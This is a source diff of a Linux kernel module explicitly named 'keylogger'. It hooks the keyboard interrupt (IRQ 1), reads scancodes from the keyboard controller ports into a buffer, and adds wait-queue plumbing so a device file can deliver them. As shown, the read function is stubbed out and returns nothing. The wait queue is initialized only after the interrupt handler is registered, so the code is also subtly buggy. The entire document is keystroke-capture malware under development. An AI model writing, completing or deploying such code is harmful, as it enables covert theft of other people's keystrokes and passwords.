@@ -2,8 +2,10 @@
 #include <linux/kernel.h>
 #include <linux/debugfs.h>
 #include <linux/fs.h>
+#include <linux/wait.h>
 #include <linux/interrupt.h>
 #include <linux/miscdevice.h>
+
 
 #define PATH "keylog"
 #define KEYBOARD_STATUS 0x64
@@ -18,6 +20,7 @@ static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *of
 
 struct dentry		*dir_entry, *file_entry;
 static unsigned short	kbd_buffer = 0x0000;
+static wait_queue_head_t kbd_irq_waitq;
 
 static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)
 {
@@ -27,7 +30,15 @@ static ssize_t	key_write(struct file *filep, const char *buffer, size_t len, lof
 
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
-	printk(KERN_INFO "in the read\n");
+/*	printk(KERN_INFO "in the read\n");
+	DEFINE_WAIT(wait);
+	printk(KERN_INFO "keylogger: after define\n");
+	prepare_to_wait(&kbd_irq_waitq, &wait, TASK_INTERRUPTIBLE);
+	printk(KERN_INFO "keylogger: after prepare\n");
+        //schedule();
+	//printk(KERN_INFO "keylogger: after schedule\n");
+        finish_wait(&kbd_irq_waitq, &wait);
+	printk(KERN_INFO "keylogger: after finish wait\n");*/
 	return 0;
 }
 
@@ -80,8 +91,7 @@ static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 	status = inb(KEYBOARD_STATUS);
 	scancode = inb(KEYBOARD_DATA);
 	kbd_buffer = (unsigned short) ((status << 8) | (scancode & 0x00ff));
-//	printk(KERN_INFO "keylogger: kbd_buffer -> [%d]\n", kbd_buffer);
-	//wake_up_interruptible(&kbd_irq_waitq);
+	wake_up_interruptible(&kbd_irq_waitq);
 	return IRQ_HANDLED;
 }
 
@@ -102,6 +112,8 @@ static int		__init keylogger_init(void)
 		return 1;
 	printk(KERN_INFO "keylogger: name [%s] minor  [%i]\n", key_dev.name, key_dev.minor);
 	request_irq(1, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler);
+	printk(KERN_INFO "keylogger: kbd_buffer -> [%d]\n", kbd_buffer);
+	init_waitqueue_head(&kbd_irq_waitq);
 
 	return 0;
 }
